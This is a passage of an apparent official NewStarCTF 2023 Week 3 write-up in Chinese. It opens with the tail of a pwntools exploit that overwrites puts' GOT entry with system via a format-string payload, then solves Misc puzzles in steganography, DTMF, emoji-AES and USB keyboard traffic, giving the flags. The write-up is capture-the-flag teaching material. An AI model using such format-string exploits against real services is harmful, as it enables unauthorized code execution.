class="ql-code-block ql-word-wrap-true">sys_addr &nbsp;= libc_base + libc.symbols['system'] </div><div line="LLdu" data-language="plain" class="ql-code-block ql-word-wrap-true">print(hex(sys_addr))</div><div line="Y57f" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="IMFT" data-language="plain" class="ql-code-block ql-word-wrap-true">p.sendlineafter("(0/1)\n", '1')</div><div line="S75Z" data-language="plain" class="ql-code-block ql-word-wrap-true">fmtpayload = fmtstr_payload(offset, {puts_got:sys_addr})</div><div line="3vzi" data-language="plain" class="ql-code-block ql-word-wrap-true">p.sendlineafter("What's it\n",fmtpayload)</div><div line="iZMy" data-language="plain" class="ql-code-block ql-word-wrap-true">p.sendline('0')</div><div line="hI2Y" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="AgDK" data-language="plain" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" class="ql-align-center ql-heading-title" line="DgTC" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Misc</p><h1><div ql-global="true" line="Uncp" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>阳光开朗大男孩</div></h1><ul data-list-style="circle"><li ql-global="true" line="FDAi" class="bullet-item"><strong>考点</strong>：emoji-AES、社会主义核心价值观加密</li></ul><ul data-list-style="circle"><li ql-global="true" line="x6ju" class="bullet-item"><strong>FLAG</strong>：flag{3m0ji_1s_s0000_1nt3rest1ng_0861aada1050}</li></ul><ul data-list-style="circle"><li ql-global="true" line="7wlb" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="jSqA">题目给出了secret.txt和flag.txt两个文件，secret.txt内容如下：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="KiuF" data-language="php" class="ql-code-block ql-word-wrap-true">法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由</div></div><p ql-global="true" line="zXts">在 <a class="ql-link" href="http://www.atoolbox.net/Tool.php?Id=850&amp;accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">http://www.atoolbox.net/Tool.php?Id=850</a> 进行社会主义核心价值观解密后可以得到：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="pPGS" data-language="php" class="ql-code-block ql-word-wrap-true">this_password_is_s000_h4rd_p4sssw0rdddd</div></div><p ql-global="true" line="ikNA">得到一个Key，结合flag.txt中的emoji表情可以推断出flag.txt使用了emoji-AES加密。</p><p ql-global="true" line="myHN">在 <a class="ql-link" href="https://aghorler.github.io/emoji-aes/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">https://aghorler.github.io/emoji-aes/</a> 进行emoji-AES解密，key为s000_h4rd_p4sssw0rdddd，得到Flag：</p><p ql-global="true" line="uYQz"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1194" height="auto" ori-width="1194" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(1).png" ori-height="505" data-src="https://uploader.shimo.im/f/Sj13xMtnZHfBc0Vn.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="t3Ks"><br></p><h1><div ql-global="true" line="83aR" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>滴滴滴</div></h1><ul data-list-style="circle"><li ql-global="true" line="pzSg" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">steghide隐写、DTMF</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="i3y3" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{1nf0rm4t10n_s3cur1ty_1s_a_g00d_j0b_94e0308b}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="6tPm" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="4Y0S">题目给出一个wav文件和一个jpg文件，其中wav文件听起来像是拨号音，在<a class="ql-link" href="http://dialabc.com/sound/detect/index.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">http://dialabc.com/sound/detect/index.html</a> 进行拨号音识别：</p><p ql-global="true" class="ql-align-center" line="2hVQ"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="640" height="auto" ori-width="640" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(2).png" ori-height="526" data-src="https://uploader.shimo.im/f/TZL0humHIHjYg9wQ.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="yQD3">得到拨号音的内容为：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="ORgn" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-number">52563319066</span></div></div><p ql-global="true" line="8wWm">结合题目简介的提示，这串数字应该是某处使用的密码，因此可以尝试steghide工具来对jpg图片进行隐写内容提取：</p><p ql-global="true" class="ql-align-center" line="cpa5"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="527" height="auto" ori-width="527" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(3).png" ori-height="159" data-src="https://uploader.shimo.im/f/UcSNx2G6bKFE1Ets.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="2OOL">得到一个txt文件，打开即是Flag：</p><p ql-global="true" class="ql-align-center" line="pzxM"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="497" height="auto" ori-width="497" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(4).png" ori-height="212" data-src="https://uploader.shimo.im/f/2PIlhH1d2sy1WJ5P.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="Kqd9"><br></p><h1><div ql-global="true" line="ULnS" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>大怨种</div></h1><ul data-list-style="circle"><li ql-global="true" line="5GiO" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">GIF逐帧分离、汉信码</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="i4yC" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{1_d0nt_k0nw_h0w_to_sc4n_th1s_c0d3_acef808a868e}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="wBA0" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="bn7e">题目给出gif图片，编写一个脚本提取出gif的每一帧图片：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="vjcX" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</div><div line="nRdf" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> os</div><div line="K9ua" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="DXGE" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_frames</span>(<span class="hljs-params">gif_path, output_dir</span>):</div><div line="0YMW" data-language="python" class="ql-code-block ql-word-wrap-true">    gif = Image.<span class="hljs-built_in">open</span>(gif_path)</div><div line="t2xt" data-language="python" class="ql-code-block ql-word-wrap-true">    os.makedirs(output_dir, exist_ok=<span class="hljs-literal">True</span>)</div><div line="wbZd" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="G2K3" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">try</span>:</div><div line="L9iH" data-language="python" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</div><div line="E9Ln" data-language="python" class="ql-code-block ql-word-wrap-true">            current_frame = gif.tell()</div><div line="0prX" data-language="python" class="ql-code-block ql-word-wrap-true">            output_path = os.path.join(output_dir, <span class="hljs-string">f"frame_<span class="hljs-subst">{current_frame}</span>.png"</span>)</div><div line="8KUQ" data-language="python" class="ql-code-block ql-word-wrap-true">            gif.save(output_path, <span class="hljs-string">"PNG"</span>)</div><div line="XWDK" data-language="python" class="ql-code-block ql-word-wrap-true">            gif.seek(current_frame + <span class="hljs-number">1</span>)</div><div line="WSQD" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">except</span> EOFError:</div><div line="ytIy" data-language="python" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">pass</span></div><div line="Jxw8" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="vZG0" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"提取完成！"</span>)</div><div line="wmJg" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Kd2S" data-language="python" class="ql-code-block ql-word-wrap-true">gif_path = <span class="hljs-string">"1.gif"</span></div><div line="93XE" data-language="python" class="ql-code-block ql-word-wrap-true">output_dir = <span class="hljs-string">"./res/"</span></div><div line="91hM" data-language="python" class="ql-code-block ql-word-wrap-true">extract_frames(gif_path, output_dir)</div></div><p ql-global="true" line="ZG8r">其中有一帧图像是这样的：</p><p ql-global="true" class="ql-align-center" line="Iu5y"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="238px" height="auto" ori-width="930" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(5).png" ori-height="901" data-src="https://uploader.shimo.im/f/XRppKX71FXhIoiNh.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="UlQM">左上角的是汉信码，可以在 <a class="ql-link" href="https://tuzim.net/hxdecode/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">https://tuzim.net/hxdecode/</a> 在线扫描，扫描后得到Flag：</p><p ql-global="true" line="s5vJ"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1031" height="auto" ori-width="1031" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(6).png" ori-height="314" data-src="https://uploader.shimo.im/f/MDWh9FXwT8hBVeBT.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="yyhC"><br></p><h1><div ql-global="true" line="E5Ny" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">键盘侠</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="LJBm" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">USB键盘流量分析</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="fVcf" class="bullet-item"><strong>FLAG</strong>：flag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}</li></ul><ul data-list-style="circle"><li ql-global="true" line="XuH7" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="R4sW">打开题目发现是USB流量，结合题目名猜测是键盘流量，使用WireShark过滤器过滤出所有的键盘流量，然后导出保存为res.pcapng：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="UepZ" data-language="python" class="ql-code-block ql-word-wrap-true">usb.src ==<span class="hljs-string">"1.15.1"</span></div></div><p ql-global="true" line="fjko">使用tshark命令对流量数据进行提取并去除空行：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="Pn78" data-language="python" class="ql-code-block ql-word-wrap-true">tshark -r res.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">'/^\s*$/d'</span> &gt; usbdata.txt</div></div><p ql-global="true" line="AO3L">导出后使用以下脚本进行按键信息提取：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="DUhG" data-language="python" class="ql-code-block ql-word-wrap-true">normalKeys = {</div><div line="qxC7" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp; <span class="hljs-string">"04"</span>:<span class="hljs-string">"a"</span>, <span class="hljs-string">"05"</span>:<span class="hljs-string">"b"</span>, <span class="hljs-string">"06"</span>:<span class="hljs-string">"c"</span>, <span class="hljs-string">"07"</span>:<span class="hljs-string">"d"</span>, <span class="hljs-string">"08"</span>:<span class="hljs-string">"e"</span>, <span class="hljs-string">"09"</span>:<span class="hljs-string">"f"</span>, <span class="hljs-string">"0a"</span>:<span class="hljs-string">"g"</span>, <span class="hljs-string">"0b"</span>:<span class="hljs-string">"h"</span>, <span class="hljs-string">"0c"</span>:<span class="hljs-string">"i"</span>, <span class="hljs-string">"0d"</span>:<span class="hljs-string">"j"</span>, <span class="hljs-string">"0e"</span>:<span class="hljs-string">"k"</span>, <span class="hljs-string">"0f"</span>:<span class="hljs-string">"l"</span>, <span class="hljs-string">"10"</span>:<span class="hljs-string">"m"</span>, <span class="hljs-string">"11"</span>:<span class="hljs-string">"n"</span>, <span class="hljs-string">"12"</span>:<span class="hljs-string">"o"</span>, <span class="hljs-string">"13"</span>:<span class="hljs-string">"p"</span>, <span class="hljs-string">"14"</span>:<span class="hljs-string">"q"</span>, <span class="hljs-string">"15"</span>:<span class="hljs-string">"r"</span>, <span class="hljs-string">"16"</span>:<span class="hljs-string">"s"</span>, <span class="hljs-string">"17"</span>:<span class="hljs-string">"t"</span>, <span class="hljs-string">"18"</span>:<span class="hljs-string">"u"</span>, <span class="hljs-string">"19"</span>:<span class="hljs-string">"v"</span>, <span class="hljs-string">"1a"</span>:<span class="hljs-string">"w"</span>, <span class="hljs-string">"1b"</span>:<span class="hljs-string">"x"</span>, <span class="hljs-string">"1c"</span>:<span class="hljs-string">"y"</span>, <span class="hljs-string">"1d"</span>:<span class="hljs-string">"z"</span>,<span class="hljs-string">"1e"</span>:<span class="hljs-string">"1"</span>, <span class="hljs-string">"1f"</span>:<span class="hljs-string">"2"</span>, <span class="hljs-string">"20"</span>:<span class="hljs-string">"3"</span>, <span class="hljs-string">"21"</span>:<span class="hljs-string">"4"</span>, <span class="hljs-string">"22"</span>:<span class="hljs-string">"5"</span>, <span class="hljs-string">"23"</span>:<span class="hljs-string">"6"</span>,<span class="hljs-string">"24"</span>:<span class="hljs-string">"7"</span>,<span class="hljs-string">"25"</span>:<span class="hljs-string">"8"</span>,<span class="hljs-string">"26"</span>:<span class="hljs-string">"9"</span>,<span class="hljs-string">"27"</span>:<span class="hljs-string">"0"</span>,<span class="hljs-string">"28"</span>:<span class="hljs-string">"&lt;RET&gt;"</span>,<span class="hljs-string">"29"</span>:<span class="hljs-string">"&lt;ESC&gt;"</span>,<span class="hljs-string">"2a"</span>:<span class="hljs-string">"&lt;DEL&gt;"</span>, <span class="hljs-string">"2b"</span>:<span class="hljs-string">"t"</span>,<span class="hljs-string">"2c"</span>:<span class="hljs-string">"&lt;SPACE&gt;"</span>,<span class="hljs-string">"2d"</span>:<span class="hljs-string">"-"</span>,<span class="hljs-string">"2e"</span>:<span class="hljs-string">"="</span>,<span class="hljs-string">"2f"</span>:<span class="hljs-string">"["</span>,<span class="hljs-string">"30"</span>:<span class="hljs-string">"]"</span>,<span class="hljs-string">"31"</span>:<span class="hljs-string">"\\"</span>,<span class="hljs-string">"32"</span>:<span class="hljs-string">"&lt;NON&gt;"</span>,<span class="hljs-string">"33"</span>:<span class="hljs-string">";"</span>,<span class="hljs-string">"34"</span>:<span class="hljs-string">"'"</span>,<span class="hljs-string">"35"</span>:<span class="hljs-string">"&lt;GA&gt;"</span>,<span class="hljs-string">"36"</span>:<span class="hljs-string">","</span>,<span class="hljs-string">"37"</span>:<span class="hljs-string">"."</span>,<span class="hljs-string">"38"</span>:<span class="hljs-string">"/"</span>,<span class="hljs-string">"39"</span>:<span class="hljs-string">"&lt;CAP&gt;"</span>,<span class="hljs-string">"3a"</span>:<span class="hljs-string">"&lt;F1&gt;"</span>,<span class="hljs-string">"3b"</span>:<span class="hljs-string">"&lt;F2&gt;"</span>, <span class="hljs-string">"3c"</span>:<span class="hljs-string">"&lt;F3&gt;"</span>,<span class="hljs-string">"3d"</span>:<span class="hljs-string">"&lt;F4&gt;"</span>,<span class="hljs-string">"3e"</span>:<span class="hljs-string">"&lt;F5&gt;"</span>,<span class="hljs-string">"3f"</span>:<span class="hljs-string">"&lt;F6&gt;"</span>,<span class="hljs-string">"40"</span>:<span class="hljs-string">"&lt;F7&gt;"</span>,<span class="hljs-string">"41"</span>:<span class="hljs-string">"&lt;F8&gt;"</span>,<span class="hljs-string">"42"</span>:<span class="hljs-string">"&lt;F9&gt;"</span>,<span class="hljs-string">"43"</span>:<span class="hljs-string">"&lt;F10&gt;"</span>,<span class="hljs-string">"44"</span>:<span class="hljs-string">"&lt;F11&gt;"</span>,<span class="hljs-string">"45"</span>:<span class="hljs-string">"&lt;F12&gt;"</span></div><div line="G9tQ" data-language="python" class="ql-code-block ql-word-wrap-true">}</div><div line="u5ny" data-language="python" class="ql-code-block ql-word-wrap-true">shiftKeys = {</div><div line="6IW5" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp; <span class="hljs-string">"04"</span>:<span class="hljs-string">"A"</span>, <span class="hljs-string">"05"</span>:<span class="hljs-string">"B"</span>, <span class="hljs-string">"06"</span>:<span class="hljs-string">"C"</span>, <span class="hljs-string">"07"</span>:<span class="hljs-string">"D"</span>, <span class="hljs-string">"08"</span>:<span class="hljs-string">"E"</span>, <span class="hljs-string">"09"</span>:<span class="hljs-string">"F"</span>, <span class="hljs-string">"0a"</span>:<span class="hljs-string">"G"</span>, <span class="hljs-string">"0b"</span>:<span class="hljs-string">"H"</span>, <span class="hljs-string">"0c"</span>:<span class="hljs-string">"I"</span>, <span class="hljs-string">"0d"</span>:<span class="hljs-string">"J"</span>, <span class="hljs-string">"0e"</span>:<span class="hljs-string">"K"</span>, <span class="hljs-string">"0f"</span>:<span class="hljs-string">"L"</span>, <span class="hljs-string">"10"</span>:<span class="hljs-string">"M"</span>, <span class="hljs-string">"11"</span>:<span class="hljs-string">"N"</span>, <span class="hljs-string">"12"</span>:<span class="hljs-string">"O"</span>, <span class="hljs-string">"13"</span>:<span class="hljs-string">"P"</span>, <span class="hljs-string">"14"</span>:<span class="hljs-string">"Q"</span>, <span class="hljs-string">"15"</span>:<span class="hljs-string">"R"</span>, <span class="hljs-string">"16"</span>:<span class="hljs-string">"S"</span>, <span class="hljs-string">"17"</span>:<span class="hljs-string">"T"</span>, <span class="hljs-string">"18"</span>:<span class="hljs-string">"U"</span>, <span class="hljs-string">"19"</span>:<span class="hljs-string">"V"</span>, <span class="hljs-string">"1a"</span>:<span class="hljs-string">"W"</span>, <span class="hljs-string">"1b"</span>:<span class="hljs-string">"X"</span>, <span class="hljs-string">"1c"</span>:<span class="hljs-string">"Y"</span>, <span class="hljs-string">"1d"</span>:<span class="hljs-string">"Z"</span>,<span class="hljs-string">"1e"</span>:<span class="hljs-string">"!"</span>, <span class="hljs-string">"1f"</span>:<span class="hljs-string">"@"</span>, <span class="hljs-string">"20"</span>:<span class="hljs-string">"#"</span>, <span class="hljs-string">"21"</span>:<span class="hljs-string">"$"</span>, <span class="hljs-string">"22"</span>:<span class="hljs-string">"%"</span>, <span class="hljs-string">"23"</span>:<span class="hljs-string">"^"</span>,<span class="hljs-string">"24"</span>:<span class="hljs-string">"&amp;"</span>,<span class="hljs-string">"25"</span>:<span class="hljs-string">"*"</span>,<span class="hljs-string">"26"</span>:<span class="hljs-string">"("</span>,<span class="hljs-string">"27"</span>:<span class="hljs-string">")"</span>,<span class="hljs-string">"28"</span>:<span class="hljs-string">"&lt;RET&gt;"</span>,<span class="hljs-string">"29"</span>:<span class="hljs-string">"&lt;ESC&gt;"</span>,<span class="hljs-string">"2a"</span>:<span class="hljs-string">"&lt;DEL&gt;"</span>, <span class="hljs-string">"2b"</span>:<span class="hljs-string">"t"</span>,<span class="hljs-string">"2c"</span>:<span class="hljs-string">"&lt;SPACE&gt;"</span>,<span class="hljs-string">"2d"</span>:<span class="hljs-string">"_"</span>,<span class="hljs-string">"2e"</span>:<span class="hljs-string">"+"</span>,<span class="hljs-string">"2f"</span>:<span class="hljs-string">"{"</span>,<span class="hljs-string">"30"</span>:<span class="hljs-string">"}"</span>,<span class="hljs-string">"31"</span>:<span class="hljs-string">"|"</span>,<span class="hljs-string">"32"</span>:<span class="hljs-string">"&lt;NON&gt;"</span>,<span class="hljs-string">"33"</span>:<span class="hljs-string">"\""</span>,<span class="hljs-string">"34"</span>:<span class="hljs-string">":"</span>,<span class="hljs-string">"35"</span>:<span class="hljs-string">"&lt;GA&gt;"</span>,<span class="hljs-string">"36"</span>:<span class="hljs-string">"&lt;"</span>,<span class="hljs-string">"37"</span>:<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">"38"</span>:<span class="hljs-string">"?"</span>,<span class="hljs-string">"39"</span>:<span class="hljs-string">"&lt;CAP&gt;"</span>,<span class="hljs-string">"3a"</span>:<span class="hljs-string">"&lt;F1&gt;"</span>,<span class="hljs-string">"3b"</span>:<span class="hljs-string">"&lt;F2&gt;"</span>, <span class="hljs-string">"3c"</span>:<span class="hljs-string">"&lt;F3&gt;"</span>,<span class="hljs-string">"3d"</span>:<span class="hljs-string">"&lt;F4&gt;"</span>,<span class="hljs-string">"3e"</span>:<span class="hljs-string">"&lt;F5&gt;"</span>,<span class="hljs-string">"3f"</span>:<span class="hljs-string">"&lt;F6&gt;"</span>,<span class="hljs-string">"40"</span>:<span class="hljs-string">"&lt;F7&gt;"</span>,<span class="hljs-string">"41"</span>:<span class="hljs-string">"&lt;F8&gt;"</span>,<span class="hljs-string">"42"</span>:<span class="hljs-string">"&lt;F9&gt;"</span>,<span class="hljs-string">"43"</span>:<span class="hljs-string">"&lt;F10&gt;"</span>,<span class="hljs-string">"44"</span>:<span class="hljs-string">"&lt;F11&gt;"</span>,<span class="hljs-string">"45"</span>:<span class="hljs-string">"&lt;F12&gt;"</span></div><div line="MAtY" data-language="python" class="ql-code-block ql-word-wrap-true">}</div><div line="0PPW" data-language="python" class="ql-code-block ql-word-wrap-true">nums = []</div><div line="qn4L" data-language="python" class="ql-code-block ql-word-wrap-true">keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">'usbdata.txt'</span>)</div><div line="1HzN" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:</div><div line="Uoo4" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line)!=<span class="hljs-number">17</span>:</div><div line="7Tpc" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">continue</span></div><div line="dBu2" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp; nums.append(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]+line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>])</div><div line="3O2y" data-language="python" class="ql-code-block ql-word-wrap-true">keys.close()</div><div line="1Fqk" data-language="python" class="ql-code-block ql-word-wrap-true">output = <span class="hljs-string">""</span></div><div line="akoc" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:</div><div line="ZqCf" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">"00"</span> :</div><div line="In5T" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">continue</span></div><div line="5e9w" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] <span class="hljs-keyword">in</span> normalKeys:</div><div line="ppZk" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">if</span> n[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]==<span class="hljs-string">"02"</span>:</div><div line="BYMP" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output += shiftKeys [n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]</div><div line="rPXr" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">else</span> :</div><div line="oOy3" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output += normalKeys [n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]</div><div line="bQhR" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp; <span class="hljs-keyword">else</span>:</div><div line="vYQB" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output += <span class="hljs-string">'[unknown]'</span></div><div line="7Rf0" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(<span class="hljs-string">'output :n'</span> + output)</div></div><p ql-global="true" line="JImf">得到如下结果：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="eUK3" data-language="python" class="ql-code-block ql-word-wrap-true">nw3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;<span class="hljs-number">2023</span>&lt;SPACE&gt;flag&lt;SPACE&gt;<span class="hljs-keyword">is</span>&lt;SPACE&gt;here&lt;SPACE&gt;vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa1112333888888&lt;ESC&gt;&lt;ESC&gt;2hhxgbffffbbbnnat&lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;{<span class="hljs-number">999</span>&lt;DEL&gt;&lt;DEL&gt;<span class="hljs-number">999</span>&lt;DEL&gt;&lt;DEL&gt;<span class="hljs-number">11</span>&lt;DEL&gt;9aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;2f5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;7bfc[unknown][unknown][unknown]-<span 